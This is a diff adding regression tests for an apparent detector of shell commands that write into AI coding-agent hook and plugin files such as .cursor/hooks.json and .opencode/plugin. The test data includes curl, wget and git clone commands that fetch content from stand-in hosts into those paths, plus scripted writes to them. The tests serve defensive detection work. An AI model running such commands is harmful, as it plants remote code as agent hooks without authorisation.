@@ -805,3 +805,47 @@ def test_qa6_stdin_forms(cmd):
 ])
 def test_qa6_inline_reads_silent(cmd):
     assert _only(_shell(cmd)) is None, cmd
+
+
+# ---- QA round 7 regressions -----------------------------------------------------
+@pytest.mark.parametrize("cmd", [
+    "curl -fsSLo .cursor/hooks.json https://e.x",
+    "curl -sLo .opencode/plugin/p.ts https://e.x",
+    "curl -sLo .gemini/settings.json https://e.x",
+    "wget -qO .cursor/hooks.json https://e.x",
+    "curl -o.cursor/hooks.json https://e.x",
+    "curl -sLo.cursor/hooks.json https://e.x",
+    "git clone https://e/x .gemini/extensions/x",
+    "git clone https://e/x .opencode",
+    "wget -P .opencode/plugin https://e.x/p.ts",
+    "wget --directory-prefix=.opencode/plugin https://e.x/p.ts",
+    "curl -LO --output-dir .opencode/plugin https://e.x/p.ts",
+    "cd .opencode/plugin && echo x > p.ts",
+    "cd .kiro/hooks && cp /tmp/a a.kiro.hook",
+    "cd .github/hooks && echo '{}' > x.json",
+    "uv run python - <<'EOF'\nopen('.cursor/hooks.json','w').write('x')\nEOF",
+    "poetry run python - <<'EOF'\nopen('.cursor/hooks.json','w').write('x')\nEOF",
+    "echo \"open('.cursor/hooks.json','w').write('x')\" | uv run python",
+    "npx tsx <<'EOF'\nrequire('fs').writeFileSync('.cursor/hooks.json','x')\nEOF",
+    "echo \"open('.cursor/hooks.json','w').write('x')\" | (python3)",
+])
+def test_qa7_write_forms(cmd):
+    assert _only(_shell(cmd)) is not None, cmd
+
+
+def test_qa7_relative_write_from_dedicated_cwd():
+    assert _only(_shell("echo x > evil.ts", cwd="/r/.opencode/plugin")) is not None
+    assert _only(_shell("ls -la", cwd="/r/.opencode/plugin")) is None
+    assert _only(_shell("cat p.ts > /tmp/x", cwd="/r/.opencode/plugin")) is None
+
+
+@pytest.mark.parametrize("cmd", [
+    "grep -o hooks .cursor/hooks.json",
+    "ls -lo .cursor/hooks.json",
+    "grep -rlo mcpServers .gemini/settings.json",
+    "curl -fsSL https://e.x -o /tmp/x && cat .cursor/hooks.json",
+    "git clone https://github.com/a/b /tmp/b",
+    "cd .opencode/plugin && ls && cat p.ts",
+])
+def test_qa7_silent(cmd):
+    assert _only(_shell(cmd)) is None, cmd
